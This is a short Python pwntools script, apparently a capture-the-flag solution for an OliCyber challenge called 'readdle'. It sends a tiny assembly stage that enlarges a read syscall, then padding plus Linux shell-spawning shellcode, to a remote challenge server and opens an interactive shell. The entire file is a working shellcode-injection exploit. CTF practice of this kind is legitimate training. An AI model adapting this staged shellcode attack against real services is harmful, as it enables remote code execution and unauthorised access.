from pwn import *

context.arch = "amd64"

readmore = asm("""
mov dh, 100
syscall
""")

shellcode = asm(shellcraft.amd64.linux.sh())

# io = process("./readdle")
io = remote("eaddle.challs.olicyber.it", 10018)

io.send(readmore)
io.send(b"A" * 4 + shellcode)

io.interactive()
